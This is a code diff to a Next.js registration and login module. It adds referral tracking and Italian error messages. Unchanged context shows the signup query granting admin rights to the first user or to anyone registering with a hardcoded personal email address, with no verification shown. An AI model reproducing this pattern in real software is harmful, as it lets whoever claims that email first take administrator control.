@@ -3,6 +3,12 @@
 import { redirect } from "next/navigation";
 import { createSession, destroySession, hashPassword, verifyPassword } from "@/lib/auth";
 import { queryOne } from "@/lib/db";
+import {
+  attachReferral,
+  clearReferralCookie,
+  readReferralCookie,
+  setReferralCookie,
+} from "@/lib/referrals";
 import { isStravaConfigured } from "@/lib/strava";
 import type { ActionResult } from "@/lib/types";
 
@@ -11,32 +17,45 @@ function safeNext(formData: FormData) {
   return next.startsWith("/") && !next.startsWith("//") ? next : "/";
 }
 
+export async function captureReferral(ref: string) {
+  const username = ref.trim();
+  if (/^[a-zA-Z0-9_.-]{2,24}$/.test(username)) {
+    await setReferralCookie(username);
+  }
+}
+
 export async function register(_prev: ActionResult, formData: FormData): Promise<ActionResult> {
   const username = String(formData.get("username") ?? "").trim();
   const email = String(formData.get("email") ?? "").trim().toLowerCase();
   const password = String(formData.get("password") ?? "");
+  const refParam = String(formData.get("ref") ?? "").trim();
 
-  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return { error: "Enter a valid email address" };
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return { error: "Inserisci un'email valida" };
   if (!/^[a-zA-Z0-9_.-]{2,24}$/.test(username)) {
-    return { error: "Username must be 2-24 characters: letters, numbers, _ . -" };
+    return { error: "Username: 2-24 caratteri (lettere, numeri, _ . -)" };
   }
-  if (password.length < 6) return { error: "Password must be at least 6 characters" };
+  if (password.length < 6) return { error: "La password deve avere almeno 6 caratteri" };
 
   const existing = await queryOne("select 1 from users where lower(username) = lower($1)", [username]);
-  if (existing) return { error: "Username already taken" };
+  if (existing) return { error: "Username già in uso" };
   if (await queryOne("select 1 from users where lower(email) = $1", [email])) {
-    return { error: "An account with this email already exists" };
+    return { error: "Esiste già un account con questa email" };
   }
 
-  // The first user to sign up becomes admin.
+  if (refParam) await setReferralCookie(refParam);
+
   const user = await queryOne<{ id: string }>(
     `insert into users (username, email, password_hash, is_admin)
      values ($1, $2, $3, not exists (select 1 from users) or lower($2) = 'niccologatti3@gmail.com')
      returning id`,
     [username, email, await hashPassword(password)],
   );
+
+  const ref = refParam || (await readReferralCookie());
+  await attachReferral(user!.id, ref);
+  await clearReferralCookie();
+
   await createSession(user!.id);
-  // Right after signing up, offer to link Strava (the user can skip it from the Strava screen).
   if (await isStravaConfigured()) {
     redirect(`/api/strava/connect?next=${encodeURIComponent(safeNext(formData))}`);
   }
@@ -44,7 +63,6 @@ export async function register(_prev: ActionResult, formData: FormData): Promise
 }
 
 export async function login(_prev: ActionResult, formData: FormData): Promise<ActionResult> {
-  // Accepts the email; the old username still works for accounts created before emails existed.
   const identifier = String(formData.get("email") ?? "").trim().toLowerCase();
   const password = String(formData.get("password") ?? "");
 
@@ -53,7 +71,7 @@ export async function login(_prev: ActionResult, formData: FormData): Promise<Ac
     [identifier],
   );
   if (!user || !(await verifyPassword(password, user.password_hash))) {
-    return { error: "Wrong email or password" };
+    return { error: "Email o password errati" };
   }
   await createSession(user.id);
   redirect(safeNext(formData));
